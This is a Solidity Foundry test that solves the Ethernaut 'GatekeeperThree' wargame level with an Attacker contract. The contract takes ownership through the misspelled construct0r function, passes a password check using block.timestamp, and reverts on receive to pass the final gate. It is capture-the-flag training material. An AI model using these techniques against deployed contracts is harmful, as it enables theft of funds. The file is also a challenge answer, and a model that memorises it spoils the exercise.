// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperThree} from "ethernaut/levels/GatekeeperThree.sol";

contract GatekeeperThreeTest is Test {
    GatekeeperThree target;
    address player;

    function setUp() public {
        player = makeAddr("player");
        vm.deal(player, 1 ether);

        target = new GatekeeperThree();
    }

    function attack() private {
        Attacker attacker = new Attacker();
        attacker.enter{value: 0.001 ether + 1}(target);
    }

    function testAttack() public {
        vm.startPrank(player, player); // tx.origin is pranked as well
        attack();
        vm.stopPrank();

        assertEq(target.entrant(), player, "player must be the entrant");
    }
}

contract Attacker {
    function enter(GatekeeperThree target) external payable {
        // this value is required for the third gate
        require(msg.value > 0.001 ether);

        // become owner
        target.construct0r();

        // create a SimpleTrick, setting password to block.timestamp
        // then, get allowance
        //
        // NOTE: we could also read the storage layer directly, or find
        // block.timestamp via etherscan or something
        target.createTrick();
        target.getAllowance(block.timestamp);

        // send funds for the third gate first condition
        payable(address(target)).transfer(msg.value);

        // enter
        target.enter();
    }

    // disable receiving money for the third gate
    // NOTE: the attack works without this too somehow?
    receive() external payable {
        revert();
    }
}
